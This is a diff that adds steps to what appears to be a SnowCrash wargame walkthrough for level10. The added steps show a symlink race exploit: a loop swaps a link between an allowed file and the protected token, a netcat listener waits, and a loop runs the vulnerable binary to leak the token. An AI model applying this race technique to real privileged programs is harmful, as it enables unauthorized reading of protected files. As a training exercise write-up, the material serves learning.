@@ -46,3 +46,13 @@ create link for `token`
 level10@SnowCrash:~$ ./level10 /tmp/link 0.0.0.0
 You don't have access to /tmp/link
 ```
+open three windows in `tmux`
+```
+level10@SnowCrash:~$ while true; do ln -fs ~/level10 /tmp/exploit; ln -fs ~/token /tmp/exploit; done
+```
+```
+nc -l 6969
+```
+```
+level10@SnowCrash:~$ while true; do ./level10 /tmp/exploit 0.0.0.0; done
+```
